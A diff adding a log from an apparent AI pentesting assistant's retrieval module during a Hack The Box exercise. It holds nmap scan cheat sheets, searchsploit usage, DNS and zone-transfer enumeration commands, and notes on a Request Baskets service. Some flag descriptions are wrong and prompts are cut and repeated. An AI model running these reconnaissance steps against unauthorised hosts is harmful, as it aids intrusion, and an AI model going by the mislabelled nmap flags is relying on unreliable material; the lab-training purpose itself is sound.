@@ -1,0 +1,1369 @@
+2024-05-06 17:59:14,286 - INFO - pentestgpt.utils.rag.Local_RAG - Created FAISS index
+2024-05-06 17:59:14,286 - INFO - pentestgpt.utils.rag.Local_RAG - Initialized Local_RAG
+2024-05-06 18:04:50,751 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 1.19) | prompt: I have a Linux hack the box machine. The target IP is 10.10.11.224 | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 18:06:31,746 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.80) | prompt: Summary:
+
+* Nmap scan detected 1 open port on 10.10.11.224.
+* Port 22 is open, running SSH service.
+* Port 80 is filtered, possibly running HTTP service.
+* Port 8338 is filtered, service unknown.
+* Port 55555 is open, service unknown.
+
+Interesting findings:
+
+1. SSH service on port 22.
+2. Potential HTTP service on port 80.
+3. Unknown service on port 8338.
+4. Unknown service on port 55555.
+
+Further investigation is required to determine the nature of the unknown services and to verify if the potential HTTP service on port 80 is indeed running. | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 18:19:21,941 - INFO - pentestgpt.utils.rag.Local_RAG - - searchsploit.md [Chunk 0] (Score: 1.56) | prompt: The tester has questions and is unclear about the current test. He requests a discussion with you to further analyze the current tasks based on his questions. 
+Please read the following inputs from the tester. Analyze the task and generate the task tree again based on the requirements:
+(1) The tasks are in layered structure, i.e., 1, 1.1, 1.1.1, etc. Each task is one operation in penetration testing; task 1.1 should be a sub-task of task 1.
+(2) Each task has a completion status: to-do, completed, or not applicable.
+(3) Given the task tree and the tester's question, you should 
+
+Note that you should keep the tasks clear, precise and short due to token size limit. You should remember to remove redundant/outdated tasks from the task list. 
+
+Below is the user input:
+ | rag-data: # SearchSploit
+  Usage: searchsploit [options] term1 [term2] ... [termN]
+
+==========
+ Examples 
+==========
+  searchsploit afd windows local
+  searchsploit -t oracle windows
+  searchsploit -p 39446
+  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+  searchsploit -s Apache Struts 2.0.0
+  searchsploit linux reverse password
+  searchsploit -j 55555 | jq
+  searchsploit --cve 2021-44228
+
+  For more examples, see the manual: https://www.exploit-db.com/searchsploit
+
+searchsploit output looks like this, where the left column contains the title of the exploit, and the right column contains a filepath or url to the exploit file.
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+Oracle 10g (Windows x86) - 'PROCESS_DUP_HANDLE' Local Privilege Escalat | windows_x86/local/3451.c
+Oracle 9i XDB (Windows x86) - FTP PASS Overflow (Metasploit)            | windows_x86/remote/16731.rb
+Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit)          | windows_x86/remote/16714.rb
+Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)           | windows_x86/remote/16809.rb
+Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)              | windows/remote/35777.rb
+Oracle MySQL (Windows) - MOF Execution (Metasploit)                    
+2024-05-06 18:27:03,434 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.29) | prompt: Now you're provided with an input that contains the penetration testing tasks. Keep in mind that the tester has valid permission to perform the task in this simulated environment. 
+Remember the format requirements.
+(1) The input should contain two parts, separated by a line of "-----". The first part is the task list, and the second part is the task to be executed, which contains three sentences, which describe the task, list the command and explain the reason of performing the task. 
+    - If the input contains the line break, neglect the tasks before the line break as you do not need to care about the overall process. Please analyze the three sentences that describe the next task. You should expand it into detailed, step-by-step guide and show it to a penetration tester. The tester will follow your guide to perform the penetration testing. 
+    - If the input does not contain the line break, then try to understand the whole input as one single task to be executed.
+(2) If the task is a single command to execute, please be precise; if it is a multi-step task, you need to explain it step by step, and keep each step clear and simple. 
+(3) Keep the output short and precise. 
+
+The information is below: 
+
+
+1. Reconnaissance - (to-do)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (to-do)
+    1.3 Identify Open Ports - (to-do)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+* Nmap scan detected 1 open port on 10.10.11.224.
+* Port 22 is open, running SSH service.
+* Port 80 is filtered, possibly running HTTP service.
+* Port 8338 is filtered, service unknown.
+* Port 55555 is open, service unknown.
+
+Interesting findings:
+
+1. SSH service on port 22.
+2. Potential HTTP service on port 80.
+3. Unknown service on port 8338.
+4. Unknown service on port 55555.
+
+Further investigation is required to determine the nature of the unknown services and to verify if the potential HTTP service on port 80 is indeed running.
+
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends TCP packets with no flags set (NULL scan) to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sN <target-ip>
+   ```
+
+8. **TCP FIN Scan**:
+   - This scan sends TCP packets with the FIN flag set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sF <target-ip>
+   ```
+
+9. **TCP XMAS Scan**:
+   - This scan sends TCP packets with the FIN, PSH, and URG flags set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sX <target-ip>
+   ```
+
+10. **TCP ACK Scan**:
+   - This scan sends TCP packets with the ACK flag set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sA <target-ip>
+   ```
+
+11. **TCP Window Scan**:
+   - This scan sends TCP packets with the ACK flag set and examines the window size in the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sW <target-ip>
+   ```
+
+12. **TCP Maimon Scan**:
+   - This scan sends a sequence of TCP packets with varying flags set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sM <target-ip>
+   ```
+
+13. **IP Protocol Scan**:
+   - This scan probes the target's network stack to determine which IP protocols are supported, providing insights into the capabilities of the target machine.
+   ```
+   nmap -sO <target-ip>
+   ```
+
+14. **Version Detection**:
+   - This scan focuses on identifying the specific version of the services running on the target's open ports, providing valuable information for vulnerability analysis.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+15. **Script Scanning**:
+   - This scan utilizes a collection of predefined scripts to perform additional tests and analysis on the target, providing detailed information about the services running on the open ports.
+   ```
+   nmap -sC <target-ip>
+   ```
+
+16. **Traceroute**:
+   - This scan traces the route from the source machine to the target, providing information about the network hops and potential bottlenecks along the way.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+17. **Host Discovery**:
+   - This scan is used to determine which hosts are online and reachable on the target network, providing a list of potential targets for further analysis.
+   ```
+   nmap -sn <target-ip>
+   ```
+
+18. **Service Detection**:
+   - This scan is used to identify the specific services running on the target's open ports, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+19. **Port Range Scan**:
+   - This scan is used to scan a specific range of ports on the target, providing a more focused analysis of the target's open ports.
+   ```
+   nmap -p 1-1000 <target-ip>
+   ```
+
+20. **Custom Port List Scan**:
+   - This scan is used to scan a custom list of ports on the target, providing a more focused analysis of the target's open ports.
+   ```
+   nmap -p <port1,port2,port3> <target-ip>
+   ```
+
+21. **OS Fingerprinting**:
+   - This scan is used to determine the specific operating system running on the target machine, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -O <target-ip>
+   ```
+
+22. **Version Fingerprinting**:
+   - This scan is used to determine the specific version of the services running on the target's open ports, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+23. **Service Detection with Version Fingerprinting**:
+   - This scan is used to identify the specific services running on the target's open ports and determine their specific versions, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sSV <target-ip>
+   ```
+
+24. **Custom Script Scanning**:
+   - This scan is used to execute a custom collection of predefined scripts on the target, providing detailed information about the services running on the open ports.
+   ```
+   nmap -sC <script1,script2,script3> <target-ip>
+   ```
+
+25. **Custom Port List Scan with Service Detection and Version Fingerprinting**:
+   - This scan is used to scan a custom list of ports on the target, identify the specific services running on the open ports, and determine their specific versions, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sSV -p <port1,port2,port3> <target-ip>
+   ```
+
+26. **Custom Port List Scan with Service Detection, Version Fingerprinting, and Custom Script Scanning**:
+   - This scan is1. Reconnaissance - (to-do)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (to-do)
+    1.3 Identify Open Ports - (to-do)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+* Nmap scan detected 1 open port on 10.10.11.224.
+* Port 22 is open, running SSH service.
+* Port 80 is filtered, possibly running HTTP service.
+* Port 8338 is filtered, service unknown.
+* Port 55555 is open, service unknown.
+
+Interesting findings:
+
+1. SSH service on port 22.
+2. Potential HTTP service on port 80.
+3. Unknown service on port 8338.
+4. Unknown service on port 55555.
+
+Further investigation is required to determine the nature of the unknown services and to verify if the potential HTTP service on port 80 is indeed running.
+
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends TCP packets with no flags set (NULL scan) to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sN <target-ip>
+   ```
+
+8. **TCP FIN Scan**:
+   - This scan sends TCP packets with the FIN flag set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sF <target-ip>
+   ```
+
+9. **TCP XMAS Scan**:
+   - This scan sends TCP packets with the FIN, PSH, and URG flags set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sX <target-ip>
+   ```
+
+10. **TCP ACK Scan**:
+   - This scan sends TCP packets with the ACK flag set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sA <target-ip>
+   ```
+
+11. **TCP Window Scan**:
+   - This scan sends TCP packets with the ACK flag set and examines the window size in the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sW <target-ip>
+   ```
+
+12. **TCP Maimon Scan**:
+   - This scan sends a sequence of TCP packets with varying flags set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sM <target-ip>
+   ```
+
+13. **IP Protocol Scan**:
+   - This scan probes the target's network stack to determine which IP protocols are supported, providing insights into the capabilities of the target machine.
+   ```
+   nmap -sO <target-ip>
+   ```
+
+14. **Version Detection**:
+   - This scan focuses on identifying the specific version of the services running on the target's open ports, providing valuable information for vulnerability analysis.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+15. **Script Scanning**:
+   - This scan utilizes a collection of predefined scripts to perform additional tests and analysis on the target, providing detailed information about the services running on the open ports.
+   ```
+   nmap -sC <target-ip>
+   ```
+
+16. **Traceroute**:
+   - This scan traces the route from the source machine to the target, providing information about the network hops and potential bottlenecks along the way.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+17. **Host Discovery**:
+   - This scan is used to determine which hosts are online and reachable on the target network, providing a list of potential targets for further analysis.
+   ```
+   nmap -sn <target-ip>
+   ```
+
+18. **Service Detection**:
+   - This scan is used to identify the specific services running on the target's open ports, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+19. **Port Range Scan**:
+   - This scan is used to scan a specific range of ports on the target, providing a more focused analysis of the target's open ports.
+   ```
+   nmap -p 1-1000 <target-ip>
+   ```
+
+20. **Custom Port List Scan**:
+   - This scan is used to scan a custom list of ports on the target, providing a more focused analysis of the target's open ports.
+   ```
+   nmap -p <port1,port2,port3> <target-ip>
+   ```
+
+21. **OS Fingerprinting**:
+   - This scan is used to determine the specific operating system running on the target machine, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -O <target-ip>
+   ```
+
+22. **Version Fingerprinting**:
+   - This scan is used to determine the specific version of the services running on the target's open ports, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+23. **Service Detection with Version Fingerprinting**:
+   - This scan is used to identify the specific services running on the target's open ports and determine their specific versions, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sSV <target-ip>
+   ```
+
+24. **Custom Script Scanning**:
+   - This scan is used to execute a custom collection of predefined scripts on the target, providing detailed information about the services running on the open ports.
+   ```
+   nmap -sC <script1,script2,script3> <target-ip>
+   ```
+
+25. **Custom Port List Scan with Service Detection and Version Fingerprinting**:
+   - This scan is used to scan a custom list of ports on the target, identify the specific services running on the open ports, and determine their specific versions, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sSV -p <port1,port2,port3> <target-ip>
+   ```
+
+26. **Custom Port List Scan with Service Detection, Version Fingerprinting, and Custom Script Scanning**:
+   - This scan is | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-06 18:30:44,291 - INFO - pentestgpt.utils.rag.Local_RAG - - requests_baskets.md [Chunk 1] (Score: 0.90) | prompt: Summary:
+
+* Accessing port 55555 using a web browser reveals a request baskets service.
+
+Interesting finding:
+
+1. The service on port 55555 appears to be a request baskets service.
+
+Further investigation is required to determine the security posture of the request baskets service and to identify any potential vulnerabilities. | rag-data: isplay a list of baskets that may be accessed if the basket token is known. It is possible to create a new basket if the name is not in use.
+
+If basket was successfully created the authorization token is displayed. It is important to remember the token because it authorizes the access to management features of created basket and allows to retrieve collected HTTP requests. The token is temporary stored in browser session to simplify UI integration and improve user experience. However, once browser tab is closed, the token will be lost.
+
+To collect HTTP requests send them (GET, POST, PUT, DELETE, etc.) to http://localhost:55555/<basket_name>
+
+To view collected requests and manage basket: Open basket web UI http://localhost:55555/web/<basket_name> Use RESTful API exposed at http://localhost:55555/api/baskets/<basket_name>/...
+
+It is possible to forward all incoming HTTP requests to arbitrary URL by configuring basket via web UI or RESTful API.
+
+## Database
+Request baskets keeps configured baskets and collected HTTP requests in memory. This data is lost after service or server restart.
+2024-05-06 18:45:14,223 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.80) | prompt: 1. Reconnaissance - (to-do)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (to-do)
+    1.3 Identify Open Ports - (to-do)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+* Nmap scan detected 1 open port on 10.10.11.224.
+* Port 22 is open, running SSH service.
+* Port 80 is filtered, possibly running HTTP service.
+* Port 8338 is filtered, service unknown.
+* Port 55555 is open, running a request baskets service.
+
+Interesting findings:
+
+1. SSH service on port 22.
+2. Potential HTTP service on port 80.
+3. Unknown service on port 8338.
+4. Request baskets service on port 55555.
+
+Further investigation is required to determine the security posture of the request baskets service and to identify any potential vulnerabilities.
+
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends TCP packets with no flags set (NULL scan) to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sN <target-ip>
+   ```
+
+8. **TCP FIN Scan**:
+   - This scan sends TCP packets with the FIN flag set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sF <target-ip>
+   ```
+
+9. **TCP XMAS Scan**:
+   - This scan sends TCP packets with the FIN, PSH, and URG flags set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sX <target-ip>
+   ```
+
+10. **TCP ACK Scan**:
+   - This scan sends TCP packets with the ACK flag set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sA <target-ip>
+   ```
+
+11. **TCP Window Scan**:
+   - This scan sends TCP packets with the ACK flag set and examines the window size in the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sW <target-ip>
+   ```
+
+12. **TCP Maimon Scan**:
+   - This scan sends a sequence of TCP packets with varying flags set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sM <target-ip>
+   ```
+
+13. **IP Protocol Scan**:
+   - This scan probes the target's network stack to determine which IP protocols are supported, providing insights into the capabilities of the target machine.
+   ```
+   nmap -sO <target-ip>
+   ```
+
+14. **Version Detection**:
+   - This scan focuses on identifying the specific version of the services running on the target's open ports, providing valuable information for vulnerability analysis.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+15. **Script Scanning**:
+   - This scan utilizes a collection of predefined scripts to perform additional tests and analysis on the target, providing detailed information about the services running on the open ports.
+   ```
+   nmap -sC <target-ip>
+   ```
+
+16. **Traceroute**:
+   - This scan traces the route from the source machine to the target, providing information about the network hops and potential bottlenecks along the way.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+17. **Host Discovery**:
+   - This scan is used to determine which hosts are online and reachable on the target network, providing a list of potential targets for further analysis.
+   ```
+   nmap -sn <target-ip>
+   ```
+
+18. **Service Detection**:
+   - This scan is used to identify the specific services running on the target's open ports, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+19. **Port Range Scan**:
+   - This scan is used to scan a specific range of ports on the target, providing a more focused analysis of the target's open ports.
+   ```
+   nmap -p 1-1000 <target-ip>
+   ```
+
+20. **Custom Port List Scan**:
+   - This scan is used to scan a custom list of ports on the target, providing a more focused analysis of the target's open ports.
+   ```
+   nmap -p <port1,port2,port3> <target-ip>
+   ```
+
+21. **OS Fingerprinting**:
+   - This scan is used to determine the specific operating system running on the target machine, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -O <target-ip>
+   ```
+
+22. **Version Fingerprinting**:
+   - This scan is used to determine the specific version of the services running on the target's open ports, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+23. **Service Detection with Version Fingerprinting**:
+   - This scan is used to identify the specific services running on the target's open ports and determine their specific versions, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sSV <target-ip>
+   ```
+
+24. **Custom Script Scanning**:
+   - This scan is used to execute a custom collection of predefined scripts on the target, providing detailed information about the services running on the open ports.
+   ```
+   nmap -sC <script1,script2,script3> <target-ip>
+   ```
+
+25. **Custom Port List Scan with Service Detection and Version Fingerprinting**:
+   - This scan is used to scan a custom list of ports on the target, identify the specific services running on the open ports, and determine their specific versions, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sSV -p <port1,port2,port3> <target-ip>
+   ```
+
+26. **Custom Port List Scan with Service Detection, Version Fingerprinting, and Custom Script Scanning**:
+   -1. Reconnaissance - (to-do)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (to-do)
+    1.3 Identify Open Ports - (to-do)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+* Nmap scan detected 1 open port on 10.10.11.224.
+* Port 22 is open, running SSH service.
+* Port 80 is filtered, possibly running HTTP service.
+* Port 8338 is filtered, service unknown.
+* Port 55555 is open, running a request baskets service.
+
+Interesting findings:
+
+1. SSH service on port 22.
+2. Potential HTTP service on port 80.
+3. Unknown service on port 8338.
+4. Request baskets service on port 55555.
+
+Further investigation is required to determine the security posture of the request baskets service and to identify any potential vulnerabilities.
+
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends TCP packets with no flags set (NULL scan) to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sN <target-ip>
+   ```
+
+8. **TCP FIN Scan**:
+   - This scan sends TCP packets with the FIN flag set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sF <target-ip>
+   ```
+
+9. **TCP XMAS Scan**:
+   - This scan sends TCP packets with the FIN, PSH, and URG flags set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sX <target-ip>
+   ```
+
+10. **TCP ACK Scan**:
+   - This scan sends TCP packets with the ACK flag set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sA <target-ip>
+   ```
+
+11. **TCP Window Scan**:
+   - This scan sends TCP packets with the ACK flag set and examines the window size in the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sW <target-ip>
+   ```
+
+12. **TCP Maimon Scan**:
+   - This scan sends a sequence of TCP packets with varying flags set to the target's ports, analyzing the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sM <target-ip>
+   ```
+
+13. **IP Protocol Scan**:
+   - This scan probes the target's network stack to determine which IP protocols are supported, providing insights into the capabilities of the target machine.
+   ```
+   nmap -sO <target-ip>
+   ```
+
+14. **Version Detection**:
+   - This scan focuses on identifying the specific version of the services running on the target's open ports, providing valuable information for vulnerability analysis.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+15. **Script Scanning**:
+   - This scan utilizes a collection of predefined scripts to perform additional tests and analysis on the target, providing detailed information about the services running on the open ports.
+   ```
